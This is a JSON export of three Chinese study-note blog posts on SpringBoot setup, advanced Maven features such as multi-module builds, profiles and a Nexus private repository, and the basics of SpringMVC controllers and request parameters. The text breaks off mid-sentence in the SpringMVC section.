[{"id":"92339d5e8250a642d173d5e6bd41fab8","title":"4-SpringBoot","content":"# 1、SpringBoot 简介\n# 1.1 入门案例\n\nSpringBoot 是由 Pivotal 团队提供的全新框架，其设计目的是用来简化 Spring 应用的初始搭建及开发过程\n注意：如果创建超时可以更换阿里源或下载插件 alibaba cloud toolkit\n\n\n\n创建新模块，选择 spring 初始化，并配置模块相关基础信息（选择 jar 包）\n\n\n\n选择当前模块需要使用的技术集\n\n\n\n开发控制器类\npackage com.itheima.controller;\n\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController &#123;\n\n    @GetMapping(\"/&#123;id&#125;\")\n    public String getById(@PathVariable Integer id) &#123;\n        System.out.println(\" id ===> \" + id);\n        return \"hello,springboot\";\n    &#125;\n&#125;\n\n\n运行自动生成的 Application 类\n\n\n\n\n\n最简 SpringBoot 程序所包含的基础文件\n\n\npom.xml 文件\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    &lt;modelVersion>4.0.0&lt;/modelVersion>\n    &lt;parent>\n        &lt;groupId>org.springframework.boot&lt;/groupId>\n        &lt;artifactId>spring-boot-starter-parent&lt;/artifactId>\n        &lt;version>2.7.4&lt;/version>\n        &lt;relativePath/> &lt;!-- lookup parent from repository -->\n    &lt;/parent>\n    &lt;groupId>com.itheima&lt;/groupId>\n    &lt;artifactId>springboot_01_quickstart&lt;/artifactId>\n    &lt;version>0.0.1-SNAPSHOT&lt;/version>\n\n    &lt;properties>\n        &lt;java.version>1.8&lt;/java.version>\n    &lt;/properties>\n    &lt;dependencies>\n        &lt;dependency>\n            &lt;groupId>org.springframework.boot&lt;/groupId>\n            &lt;artifactId>spring-boot-starter-web&lt;/artifactId>\n        &lt;/dependency>\n    &lt;/dependencies>\n&lt;/project>\n\n\nApplication 类\npackage com.itheima;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\n@SpringBootApplication\npublic class Springboot01QuickstartApplication &#123;\n\n    public static void main(String[] args) &#123;\n        SpringApplication.run(Springboot01QuickstartApplication.class, args);\n    &#125;\n\n&#125;\n\n\n\n\nSpring 程序与 SpringBoot 程序对比\n\n注：基于 idea 开发 SpringBoot 程序需要确保联网且能够加载到程序框架结构\n\n\n# 1.2 基于 SpringBoot 官网创建项目\n\n\n\nurl：https://spring.io/projects/spring-boot，点击下方 quickstart your project\n\n\n点击 GENERATE 后会生成压缩包，可以使用其他环境直接导入\n\n\n# 1.3 SpringBoot 项目快速启动\n\n前后端分离合作开发\n\n\n\n对 SpringBoot 项目打包（执行 maven 构建指令 package）成 jar\n\n\n执行启动指令\njava -jar springboot.jar\n\n\n\n# 1.4 SpringBoot 简介（起步依赖）\n\n\nSpringBoot 是由 Pivotal 团队提供的全新框架，其设计目的是用来简化 Spring 应用的初始搭建及开发过程\n\n\nSpring 缺点\n\n配置繁琐\n依赖设置繁琐\n\n\n\nSpringBoot 程序优点\n\n自动配置\n起步依赖（简化依赖配置）\n辅助功能（内置服务器，…）\n\n\n\n起步依赖\n\n\n\nstarter\n\nSpringBoot 中常见项目名称，定义了当前项目使用的所有项目坐标，以达到减少依赖配置的目的\n\n\n\nparent\n\n所有 SpringBoot 项目要继承的项目，定义了若干个坐标版本号（依赖管理，而非依赖），以达到减少依赖冲突的目的\nspring-boot-starter-parent (2.5.0) 与 spring-boot-starter-parent (2.4.6) 共计 57 处坐标版本不同\n\n\n\n实际开发\n\n使用任意坐标时，仅书写 GAV 中的 G 和 A，V 由 SpringBoot 提供\n如发生坐标错误，再指定 version (要小心版本冲突)\n\n\n\n","slug":"4-SpringBoot","date":"2022-10-12T15:03:21.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"657aa05e9a7f7e2d17299d958431fbf1","title":"maven高级","content":"# 1、分模块开发与设计\n# 1.1 分模块开发意义\n\n\n将原始模块按照功能拆分成若干个子模块，方便模块间的相互调用、接口共享\n\n\n\n# 1.2 分模块开发入门案例\n\n\n创建 maven 模块\n\n\n\n书写模块代码\n分模块开发需要先针对模块功能进行设计，再进行编码。不会现将工程开发完毕再进行拆模块\n\n\n通过 maven 指令安装模块到本地仓库 (install 指令)\n团队内部开发需要发布模块功能到团队内部可共享的仓库中（私服）\n\n\n\n在需要引用的模块坐标中导入需要用的模块\n&lt;dependency>\n    &lt;groupId>com.augseventh&lt;/groupId>\n    &lt;artifactId>domain&lt;/artifactId>\n    &lt;version>1.0-SNAPSHOT&lt;/version>\n&lt;/dependency>\n\n\n# 2、依赖管理\n# 2.1 依赖传递\n\n\n依赖是指当前项目运行所需的 jar，一个项目可以设置多个依赖\n\n\n依赖具有传递性\n\n直接依赖：在当前项目中通过依赖配置建立的依赖关系\n间接依赖：被依赖的资源如果依赖其他资源，当前项目间接依赖其他资源\n\n\n\n\n依赖传递冲突问题\n\n路径优先：当依赖中出现相同的资源时，层级越深，优先级越低，层级越浅，优先级越高\n声明优先：当资源在相同层级被依赖时，配置顺序靠前的覆盖配置顺序靠后的\n特殊优先：当同级配置了相同资源的不同版本，后配置的覆盖先配置的\n\n\n\n\n# 2.2 可选依赖\n\n\n可选依赖是隐藏当前工程所依赖的资源，隐藏后对应资源将不具有依赖传递性 —— 不透明\n\n如 01 模块使用了 spring 依赖，将 optional 设置为 true 后，被 02 模块继承后将不导入 spring 依赖\n\n&lt;dependency>\n    &lt;groupId>org.webjars.npm&lt;/groupId>\n    &lt;artifactId>json-logic-js&lt;/artifactId>\n    &lt;version>2.0.2&lt;/version>\n    &lt;optional>true&lt;/optional> //隐藏依赖选项\n&lt;/dependency>\n\n\n可选依赖是当前模块的依赖不想给别人用\n\n\n# 2.3 排除依赖\n\n\n排除依赖指主动断开依赖的资源，被排除的资源无需指定版本 —— 不需要\n&lt;dependency>\n    &lt;groupId>org.webjars.npm&lt;/groupId>\n    &lt;artifactId>json-logic-js&lt;/artifactId>\n    &lt;version>2.0.2&lt;/version>\n    &lt;exclusions>\n        &lt;exclusion>\n            &lt;groupId>log4j&lt;/groupId>\n            &lt;artifactId>log4j&lt;/artifactId>\n        &lt;/exclusion>\n    &lt;/exclusions>\n&lt;/dependency>\n\n\n排除依赖是用别人的资源别人的依赖不想用\n\n\n排除依赖资源仅指定 GA 即可，不需要指定 V\n\n\n# 3、继承与聚合\n# 3.1 聚合\n\n\n聚合：将多个模块组织成一个整体，同时进行项目构建的过程称为聚合\n\n\n聚合工程：通常是一个不具有业务功能的 “空” 工程（有且仅有一个 pom 文件)\n\n\n作用：使用聚合工程可以将多个工程编组，通过对聚合工程进行构建，实现对所包含的模块进行同步构建\n\n\n当工程中某个模块发生更新（变更）时，必须保障工程中与已更新模块关联的模块同步更新，此时可以使用聚合工程来解决批量模块同步构建的问题\n\n\n\n\n\n\n\n创建 maven 模块作为父工程，设置打包类型为 pom\n&lt;groupId>com.augseventh&lt;/groupId>\n&lt;artifactId>maven_01_parent&lt;/artifactId>\n&lt;version>1.0-SNAPSHOT&lt;/version>\n&lt;!--    设置打包方式为pom-->\n&lt;packaging>pom&lt;/packaging>\n\n\n设置当前聚合工程所包含的子模块的名称\n&lt;!--    设置管理模块的名称-->\n&lt;modules>\n    &lt;module>../domain&lt;/module>\n    &lt;module>../WebService&lt;/module>\n&lt;/modules>\n聚合工程中所包含的模块在进行构建时会根据模块间的依赖关系设置构建顺序，与聚合工程中模块的配置书写位置无关\n参与聚合的工程无法向上感知是否参与聚合，只能向下配置哪些模块参与本工程的聚合\n\n\n# 3.2 继承\n\n\n概念：继承描述的是两个工程间的关系，与 java 中的继承相似，子工程可以继承父工程中的配置信息，常见于依赖关系的继承\n作用：\n\n简化配置\n减少版本冲突\n\n\n\n\n\n创建父模块，设置打包方式为 pom\n\n\n在父工程的 pom 文件中配置依赖关系（子工程将沿用父工程中的依赖关系）\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>junit&lt;/groupId>\n        &lt;artifactId>junit&lt;/artifactId>\n        &lt;version>4.12&lt;/version>\n        &lt;scope>test&lt;/scope>\n    &lt;/dependency>\n&lt;/dependencies>\n\n\n在父工程中配置子工程中可选的依赖关系\n&lt;dependencyManagement>\n    &lt;dependencies>\n        &lt;dependency>\n            &lt;groupId>junit&lt;/groupId>\n            &lt;artifactId>junit&lt;/artifactId>\n            &lt;version>4.12&lt;/version>\n            &lt;scope>test&lt;/scope>\n        &lt;/dependency>\n        ......\n    &lt;/dependencies>\n&lt;/dependencyManagement>\n\n\n在子工程中配置当前工程所继承的父工程\n&lt;!--    配置当前工程继承自parent工程-->\n&lt;parent>\n    &lt;groupId>com.augseventh&lt;/groupId>\n    &lt;artifactId>maven_01_parent&lt;/artifactId>\n    &lt;version>1.0-SNAPSHOT&lt;/version>\n    &lt;!--    填写父工程的pom文件-->\n    &lt;relativePath>../maven_01_parent/pom.xml&lt;/relativePath>\n&lt;/parent>\n\n\n在子工程中配置使用父工程中可选依赖的坐标\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>com.alibaba&lt;/groupId>\n        &lt;artifactId>druid&lt;/artifactId>\n    &lt;/dependency>\n&lt;/dependencies>\n子工程中使用父工程中的可选依赖时，仅需要提供群组 id 和项目 id，无需提供版本，版本由父工程统一提供，避免版本冲突\n子工程中还可以定义父工程中没有定义的依赖关系\n\n\n# 3.3 聚合与继承的区别\n\n作用\n\n聚合用于快速构建项目\n继承用于快速配置\n\n\n相同点\n\n聚合与继承的 pom. xml 文件打包方式均为 pom，可以将两种关系制作到同一个 pom 文件中\n聚合与继承均属于设计型模块，并无实际的模块内容\n\n\n不同点\n\n聚合是在当前模块中配置关系，聚合可以感知到参与聚合的模块有哪些\n继承是在子模块中配置关系，父模块无法感知哪些子模块继承了自己\n\n\n\n# 4、属性\n# 4.1 属性\n\n\n\n定义属性\n&lt;!--    定义属性-->\n&lt;properties>\n    &lt;spring.version>5.1.9.RELEASE&lt;/spring.version>\n    &lt;junit.version>4.12&lt;/junit.version>\n&lt;/properties>\n尖括号内的名称可以随便写\n\n\n引用属性\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-context&lt;/artifactId>\n        &lt;version>$&#123;spring.version&#125;&lt;/version>\n    &lt;/dependency>\n&lt;/dependencies>\n\n\n# 4.2 配置文件加载属性\n\n\n定义属性\n&lt;!--    定义属性-->\n&lt;properties>\n    &lt;spring.version>5.1.9.RELEASE&lt;/spring.version>\n    &lt;junit.version>4.12&lt;/junit.version>\n    &lt;jdbc.url>jdbc:mysql://127.0.0.1:3306/ssm_db&lt;/jdbc.url>\n&lt;/properties>\n\n\n配置文件中引用属性\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=$&#123;jdbc.url&#125;\njdbc.username=root\njdbc.password=123456\n\n\n开启资源文件目录加载属性的过滤器\n&lt;build>\n    &lt;resources>\n        &lt;resource>\n            &lt;directory>$&#123;project.basedir&#125;src/main/resources&lt;/directory>\n            &lt;filtering>true&lt;/filtering>\n        &lt;/resource>\n    &lt;/resources>\n&lt;/build>\n开启过滤器是能让配置文件使用 ${} 格式的语句\n\n\n配置 maven 打 war 包时，忽略 web.xml 检查\n&lt;plugin>\n    &lt;groupId>org.apache.tomcat.maven&lt;/groupId>\n    &lt;artifactId>tomcat7-maven-plugin&lt;/artifactId>\n    &lt;version>2.2&lt;/version>\n    &lt;configuration>\n        &lt;path>/&lt;/path>\n        &lt;port>80&lt;/port>\n    &lt;/configuration>\n&lt;/plugin>\n\n\n# 4.3 其他属性（了解）\n\n属性列表\n\n自定义属性（常用）\n内置属性\nSetting 属性\nJava 系统属性\n环境变量属性\n\n\n\n\n# 4.2 版本管理\n\n工程版本：\n\nSNAPSHOT（快照版本）\n\n项目开发过程中临时输出的版本，称为快照版本\n快照版本会随着开发的进展不断更新\n\n\nRELEASE（发布版本）\n\n项目开发到进入阶段里程碑后，向团队外部发布较为稳定的版本，这种版本所对应的构件文件是稳定的，即便进行功能的后续开发，也不会改变当前发布版本内容，这种版本称为发布版本\n\n\n\n\n发布版本\n\nalpha 版\nbeta 版\n纯数字版\n\n\n\n# 5、多环境配置与应用\n# 5.1 多环境开发\n\n\nmaven 提供配置多种环境的设定，帮助开发者使用过程中快速切换环境\n\n\n\n在父 pom 定义多环境\n&lt;profiles>\n    &lt;!--        开发环境-->\n    &lt;profile>\n        &lt;id>env_dep&lt;/id>\n        &lt;properties>\n            &lt;jdbc.url>jdbc:mysql://127.1.1.1:3306/ssm_db&lt;/jdbc.url>\n        &lt;/properties>\n        &lt;activation>\n            &lt;!--                设定是否为默认环境-->\n            &lt;activeByDefault>true&lt;/activeByDefault>\n        &lt;/activation>\n    &lt;/profile>\n\n    &lt;!--        生产环境-->\n    &lt;profile>\n        &lt;id>env_pro&lt;/id>\n        &lt;properties>\n            &lt;jdbc.url>jdbc:mysql://127.2.2.1:3306/ssm_db&lt;/jdbc.url>\n        &lt;/properties>\n    &lt;/profile>\n    &lt;!--        测试环境-->\n    &lt;profile>\n        &lt;id>env_test&lt;/id>\n        &lt;properties>\n            &lt;jdbc.url>jdbc:mysql://127.3.3.1:3306/ssm_db&lt;/jdbc.url>\n        &lt;/properties>\n    &lt;/profile>\n&lt;/profiles>\n\n\n使用多环境（构建过程）\nmvn 指令 -P 环境定义ID\nmvn install -P pro_env\n\n\n# 5.2 跳过测试\n\n应用场景\n\n功能更新中并且没有开发完毕\n快速打包\n…\n\n\n\n\n\n可以在 IDEA 控制器中直接选择跳过测试，但是会跳过所有测试\n\n\n\n使用指令跳过测试\nmvn 指令 -D skipTest\nmvn install -D skipTest\n执行的项目构建指令必须包含测试生命周期，否则无效果。例如执行 compile 生命周期，不经过 test 生命周期\n\n\n细粒度控制跳过测试 —— 插件\n&lt;plugins>\n    &lt;plugin>\n        &lt;artifactId>maven-surefire-plugin&lt;/artifactId>\n        &lt;version>2.12.4&lt;/version>\n        &lt;configuration>\n            &lt;!--                    如果值为true则跳过，和点控制器一样，如果是false则不跳过  -->\n            &lt;skipTests>false&lt;/skipTests>\n            &lt;!--         值为false时，设置排除掉不参与测试的内容-->\n            &lt;excludes>**/BookServiceTest.java&lt;/excludes>\n        &lt;/configuration>\n    &lt;/plugin>\n&lt;/plugins>\n\n\n# 6、私服\n# 6.1 私服简介\n\n\n私服是一台独立的服务器，用于解决团队内部的资源共享与资源同步的问题\n\n\nNexus\n\nSonatype 公司的一款 maven 私服产品\n下载地址：https://help.sonatype.com/repomanager3/product-information/download\n\n\n\n启动服务器（命令行启动）\nnexus.exe &#x2F;run nexus\n\n\n访问服务器：默认端口 8081\n\n\n修改基础配置信息：\n\n安装路径下 etc 目录中的 nexus-default.properties 文件保存有 nexus 基础配置信息，例如默认端口访问\n\n\n\n修改服务器运行配置信息\n\n安装路径下 bin 目录中 nexus.vmoptions 文件保存有 nexus 服务器启动对应的配置信息，例如默认占用内存空间\n\n\n\n# 6.2 私服资源操作流程分析\n\n私服中是通过仓库存储文件的\n\n\n\n私服仓库分类\n\n\n# 6.3 资源上传与下载\n# 6.3.1 资源下载\n\n\n\n配置位置：setting.xml\n&lt;!-- 配置私服访问权限 -->\n&lt;server>\n    &lt;id>私服中的服务器ID名称，就是repository的name&lt;/id>\n    &lt;username>repouser&lt;/username>\n    &lt;password>repopwd&lt;/password>\n&lt;/server>\n\n\n&lt;!-- 私服的访问路径 -->\n&lt;mirror>\n    &lt;id>mirrorId&lt;/id> 用私服组仓库的name值\n    &lt;mirrorOf>*&lt;/mirrorOf> *表示所有的都来自私服\n    &lt;url>http://my.repository.com/repo/path&lt;/url> 组仓库\n&lt;/mirror>\n\n\n# 6.3.2 资源上传\n\n资源上传需要和资源下载一样配置私服访问权限，之后在 pom 中配置上传的具体位置\n\n&lt;!--配置当前工程保存在私服中的具体位置-->\n&lt;distributionManagement>\n    &lt;!--        发布到正式版仓库-->\n    &lt;repository>\n        &lt;id>仓库的name&lt;/id>\n        &lt;url>仓库的url&lt;/url>\n    &lt;/repository>\n    &lt;!--        发布到临时版仓库-->\n    &lt;snapshotRepository>\n        &lt;id>仓库的name&lt;/id>\n        &lt;url>仓库的url&lt;/url>\n    &lt;/snapshotRepository>\n&lt;/distributionManagement>\n\n使用 maven 的 deploy 指令将项目上传到 maven 中，首次发布需要保证项目中用到的所有东西在私服中都存在，因此会下载很多东西\n父项目进行了配置之后，子项目如果没有配置继承父项目要进行配置\n\n\n\n\n工程发布的时候版本号会影响上传到哪个仓库\n&lt;groupId>com.augseventh&lt;/groupId>\n&lt;artifactId>maven_01_parent&lt;/artifactId>\n&lt;version>1.0-SNAPSHOT&lt;/version>\n&lt;version>1.0-RELEASE&lt;/version>\n\n\n发布命令：\nmvn deploy\n\n\n","slug":"maven高级","date":"2022-10-12T13:54:41.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"cd53cdbf97b8f99c953dd3eda45eed25","title":"SpringMVC","content":"# 1、SpringMVC 概述\n\nSpringMVC 技术与 Servlet 技术功能等同，均属于 web 层开发技术\n\n\n\nSpringMVC 是一种基于 java 实现 MVC 模型的轻量级 web 框架\n优点\n\n使用简单，开发便捷（相比于 Servlet）\n\n\n\n# 2、SpringMVC 入门案例\n\n\n使用 SpringMVC 技术需要先导入 SpringMVC 坐标与 Servlet 坐标\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>junit&lt;/groupId>\n        &lt;artifactId>junit&lt;/artifactId>\n        &lt;version>3.8.1&lt;/version>\n        &lt;scope>test&lt;/scope>\n    &lt;/dependency>\n    &lt;dependency>\n        &lt;groupId>javax.servlet&lt;/groupId>\n        &lt;artifactId>javax.servlet-api&lt;/artifactId>\n        &lt;version>3.1.0&lt;/version>\n        &lt;scope>provided&lt;/scope>\n    &lt;/dependency>\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-webmvc&lt;/artifactId>\n        &lt;version>5.2.10.RELEASE&lt;/version> 导入的包和spring-context版本一致\n    &lt;/dependency>\n    &lt;dependency>\n      &lt;groupId>org.springframework&lt;/groupId>\n      &lt;artifactId>spring-context&lt;/artifactId>\n      &lt;version>5.2.10.RELEASE&lt;/version>\n    &lt;/dependency>\n&lt;/dependencies>\n\n\n创建 SpringMVC 控制器类（等同于 Servlet 功能）\npackage com.itheima.controller;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n//2.定义controller\n//2.1使用@Controller来定义bean\n@Controller\npublic class UserController &#123;\n    //2.2设置当前操作的访问路径\n    @RequestMapping(\"/save\")\n    //2.3设置当前操作返回值类型\n    @ResponseBody\n    public String save()&#123;\n        System.out.println(\"user save ...\");\n        return \"&#123;'module':'mvc'&#125;\";\n    &#125;\n&#125;\n\n\n初始化 SpringMVC 环境（同 Spring 环境），设定 SpringMVC 加载对应的 bean\npackage com.itheima.config;\n\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\n\n//3.创建SpringMVC的配置文件，加载controller对应的bean\n@Configuration\n@ComponentScan(\"com.itheima.controller\")\npublic class SpringMVCConfig &#123;\n&#125;\n\n\n初始化 Servlet 容器，加载 SpringMVC 环境，并设置 SpringMVC 技术处理的请求\npackage com.itheima.config;\n\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.context.support.AnnotationConfigWebApplicationContext;\nimport org.springframework.web.servlet.support.AbstractDispatcherServletInitializer;\n\n//4.定义一个Servlet容器配置的启动类，在里面加载spring的配置\npublic class ServletContainersInitConfig extends AbstractDispatcherServletInitializer &#123;\n    //加载spring容器配置\n    @Override\n    protected WebApplicationContext createServletApplicationContext() &#123;\n        AnnotationConfigWebApplicationContext ctx = new AnnotationConfigWebApplicationContext();\n        ctx.register(SpringMvcConfig.class);\n        return ctx;\n    &#125;\n\n    //设置哪些请求归属springMVC处理\n    @Override\n    protected String[] getServletMappings() &#123;\n        return new String[] &#123;\"/\"&#125;;//表示所欲请求归SpringMVC处理\n    &#125;\n\n    //加载spring容器配置\n    @Override\n    protected WebApplicationContext createRootApplicationContext() &#123;\n        return null;\n    &#125;\n&#125;\n\n\n\n\n使用的注解：\n\n\n@Controller\n\n\n类型：类注释\n\n\n位置：SpringMVC 控制器类定义上方\n\n\n作用：设定 SpringMVC 的核心控制器 bean\n\n\n范例：\n@Controller\npublic class UserController &#123;\n&#125;\n\n\n\n\n@RequestMapping\n\n\n类型：方法注释\n\n\n位置：SpringMVC 控制器方法定义上方\n\n\n作用：设置当前控制器方法请求访问路径\n\n\n范例：\n@RequestMapping(\"/save\")\npublic String save() &#123;\n&#125;\n\n\n相关属性：value (默认)：请求访问路径\n\n\n\n\n@ResponseBody\n\n\n类型：方法注释\n\n\n位置：SpringMVC 控制器方法定义上方\n\n\n作用：设置当前控制器方法响应内容为当前返回值，无需解析\n\n\n范例：\n@RequestMapping(\"/save\")\n@ResponseBody\npublic String save() &#123;\n    System.out.println(\"user save ...\");\n    return \"&#123;'module':'mvc'&#125;\";\n&#125;\n\n\n\n\n\n\n# 3、入门案例总结\n\n\nSpringMVC 入门程序开发总结 (1+N)\n\n一次性工作\n\n创建工程，设置服务器，加载工程\n导入坐标\n创建 web 容器类，加载 SpringMVC 配置，并设置 SpringMVC 请求拦截路径\nSpringMVC 核心配置类（设置配置类，扫描 controller 包，加载 controller 控制器 bean）\n\n\n多次工作\n\n定义处理请求的控制类\n定义处理请求的控制器方法，并配置映射路径（@RequestMapping）与返回 json 数据（@ResponseBody）\n\n\n\n\n\nAbstractDispatcherServletInitializer 类是 SpringMVC 提供的快速初始化 web3.0 容器的抽象类\n\n\nAbstractDispatcherServletInitializer 提供三个接口方法供用户实现\n\n\ncreateServletApplicationContext () 方法，创建 Servlet 容器时，加载 SpringMVC 对应的 bean 并放入 WebApplicationContext 对象范围中，而 WebApplicationContext 的作用范围为 ServletContext 范围，即整个 web 容器范围\n@Override\nprotected WebApplicationContext createServletApplicationContext() &#123;\n    AnnotationConfigWebApplicationContext ctx = new AnnotationConfigWebApplicationContext();\n    ctx.register(SpringMvcConfig.class);\n    return ctx;\n&#125;\n\n\ngetServletMappings () 方法，设定 SpringMVC 对应的请求映射路径，设置为 / 表示拦截所有请求，任意请求都将转入到 SpringMVC 进行处理\n@Override\nprotected String[] getServletMappings() &#123;\n    return new String[]&#123;\"/\"&#125;;\n&#125;\n\n\ncreateRootApplicationContext () 方法，如果创建 Servlet 容器时需要加载非 SpringMVC 对应的 bean，使用当前方法进行，使用方式同 createServletApplicationContext ()\n\n\n\n\n# 4、入门案例工作流程分析\n\n启动服务器初始化过程\n\n服务器启动，执行 ServletContainersInitconfig 类，初始化 web 容器\n执行 createServletApplicationContext 方法，创建了 WebApplicationContext 对象\n加载 SpringMvcConfig\n执行 @Componentscan 加载对应的 bean\n加载 UserController，每个 @RequestMapping 的名称对应一个具体的方法\n执行 getServletMappings 方法，定义所有的请求都通过 springMVC\n\n\n\n\n\n单词请求过程\n\n发送请求 localhost/save\nweb 容器发现所有请求都经过 SspringMVC，将请求交给 SpringMVC 处理\n解析请求路径 /save\n由 /save 匹配执行对应的方法 save ()\n执行 save () 检测到有 @ResponseBody 直接将 save () 方法的返回值作为响应求体返回给请求方\n\n\n\n# 5、Controller 加载控制与业务 bean 加载控制\n\n\nSpringMVC 相关 bean（表现层 bean）\nSpring 控制的 bean\n\n业务的 bean（Service）\n功能 bean（DataSource 等）\n\n\n\n\n因为功能不同，如何避免 Spring 错误的加载到 SpringMVC 的 bean—— 加载 spring 控制的 bean 的时候排除掉 SpringMVC 控制的 bean\n\n\nSpringMVC 相关 bean 加载控制\n\nSpringMVC 加载的 bean 对应的包均在 com.itheima.controller 包内\n\n\nSpring 相关 bean 加载控制\n\n方式一: Spring 加载的 bean 设定扫描范围为 com.itheima，排除掉 controller 包内的 bean\n方式二: Spring 加载的 bean 设定扫描范围为精准范围，例如 service 包、dao 包等\n\n\n\n//方式一：（主要用）\n@Configuration\n@ComponentScan(&#123;\"com.itheima.service\",\"com.itheima.dao\"&#125;)\npublic class SpringConfig &#123;\n&#125;\n//方式二：\n@Configuration\n@ComponentScan(value = \"com.itheima\",excludeFilters = @ComponentScan.Filter(type = FilterType.ANNOTATION,classes = Controller.class) )\npublic class SpringConfig &#123;\n&#125;\n\n\n方式三：不区分 Spring 与 SPringMVC 的环境，加载到同一个环境中\n\n\nController 加载控制与业务 bean 加载控制\n\n\n@ComponentScan\n\n\n类型：类注释\n\n\n范例：\n@Configuration\n@ComponentScan(value = \"com.itheima\",\n               excludeFilters = @ComponentScan.Filter(type = FilterType.ANNOTATION,classes = Controller.class) \n              )\npublic class SpringConfig &#123;\n&#125;\n\n\n属性：\n\nexcludeFilters：排除扫描路径中加载的 bean，需要指定类别（type）与具体项（classes）\nincludeFilters：加载指定的 bean，需要指定类别（type）与具体项（classes）\n\n\n\n\n\nbean 的加载格式\n\n\npublic class ServletContainersInitConfig extends AbstractDispatcherServletInitializer &#123;\n    @Override\n    protected WebApplicationContext createServletApplicationContext() &#123;\n        AnnotationConfigWebApplicationContext annotationConfigWebApplicationContext = new AnnotationConfigWebApplicationContext();\n        annotationConfigWebApplicationContext.register(SpringMvcConfig.class);\n        return annotationConfigWebApplicationContext;\n    &#125;\n\n    @Override\n    protected String[] getServletMappings() &#123;\n        return new String[] &#123;\"/\"&#125;;\n    &#125;\n\n    @Override\n    //这个配置方法是加载spring的配置\n    protected WebApplicationContext createRootApplicationContext() &#123;\n        AnnotationConfigWebApplicationContext annotationConfigWebApplicationContext = new AnnotationConfigWebApplicationContext();\n        annotationConfigWebApplicationContext.register(SpringConfig.class);\n        return annotationConfigWebApplicationContext;\n    &#125;\n&#125;\n\n简易书写方法：继承 AbstractAnnotationConfigDispatcherServletInitializer 类，实现 3 个抽象方法\n\npublic class ServletContainersInitConfig extends AbstractAnnotationConfigDispatcherServletInitializer &#123;\n\n    @Override\n    protected Class&lt;?>[] getRootConfigClasses() &#123;\n        return new Class[]&#123;SpringConfig.class&#125;;\n    &#125;\n\n    @Override\n    protected Class&lt;?>[] getServletConfigClasses() &#123;\n        return new Class[]&#123;SpringMvcConfig.class&#125;;\n    &#125;\n\n    @Override\n    protected String[] getServletMappings() &#123;\n        return new String[]&#123;\"/\"&#125;;\n    &#125;\n&#125;\n# 6、设置请求映射路径\n\n\n团队多人开发，每人设置不同的请求路径，冲突问题如何解决 —— 设置模块名作为请求路径前缀\n\n\n名称：@RequestMapping\n\n\n类型：方法注解 类注解\n\n\n位置：SpringMVC 控制器方法定义上方\n\n\n作用：设置当前控制器方法请求访问路径，如果设置在类上统一设置当前控制器方法请求访问路径前缀\n\n\n范例：\n@Controller\n@RequestMapping(\"/user\")\npublic class UserController &#123;\n    @RequestMapping(\"/save\")\n    @ResponseBody\n    public String save()&#123;\n        System.out.println(\"user save ...\");\n        return \"&#123;'module':'user save'&#125;\";\n    &#125;\n\n    @RequestMapping(\"/delete\")\n    @ResponseBody\n    public String delete()&#123;\n        System.out.println(\"user delete ...\");\n        return \"&#123;'module':'user delete'&#125;\";\n    &#125;\n&#125;\n\n\n属性：\n\nvalue（默认）：请求访问路径，或访问路径前缀\n\n\n\n\n\n# 7、请求方式\n\nget 请求\npost 请求\n\n# 7.1 get 请求传参\n\n普通参数：url 地址传参，地址参数名与变量名相同，定义形参即可接收参数\n\n\n@Controller\npublic class UserController &#123;\n    @RequestMapping(\"/commonParam\")\n    @ResponseBody\n    public String commonParam(String name,int age)&#123;\n        System.out.println(\"普通参数传递 name==>\"+name);\n        System.out.println(\"普通参数传递 age==>\"+age);\n        return \"&#123;'module':'common param'&#125;\";\n    &#125;\n&#125;\n# 7.2 post 请求传参\n\n普通参数：form 表单 post 请求传参，表单参数名与形参变量名相同，定义形参即可接收参数\n\n\n@Controller\npublic class UserController &#123;\n    @RequestMapping(\"/commonParam\")\n    @ResponseBody\n    public String commonParam(String name,int age)&#123;\n        System.out.println(\"普通参数传递 name==>\"+name);\n        System.out.println(\"普通参数传递 age==>\"+age);\n        return \"&#123;'module':'common param'&#125;\";\n    &#125;\n&#125;\n# 7.3 post 中文乱码解决\n\n过滤器：为 web 容器添加过滤器并指定字符集，Spring-web 包中提供了专用的字符集过滤器\n\npublic class ServletContainersInitConfig extends AbstractAnnotationConfigDispatcherServletInitializer &#123;\n\t/*Spring、SpringMVC、路径配置，省略......*/\n\n    //乱码处理\n    @Override\n    protected Filter[] getServletFilters() &#123;\n        CharacterEncodingFilter filter = new CharacterEncodingFilter();\n        filter.setEncoding(\"UTF-8\");\n        return new Filter[]&#123;filter&#125;;\n    &#125;\n&#125;\n# 8、请求参数\n# 8.1 普通参数\n\n普通参数：url 地址传参，地址参数名与变量名相同，定义形参即可接收参数\n\n\n@Controller\npublic class UserController &#123;\n    @RequestMapping(\"/commonParam\")\n    @ResponseBody\n    public String commonParam(String name,int age)&#123;\n        System.out.println(\"普通参数传递 name==>\"+name);\n        System.out.println(\"普通参数传递 age==>\"+age);\n        return \"&#123;'module':'common param'&#125;\";\n    &#125;\n&#125;\n# 8.2 名称不匹配的普通参数\n\n普通参数：请求参数名与形参变量名不同，使用 @RequestParam 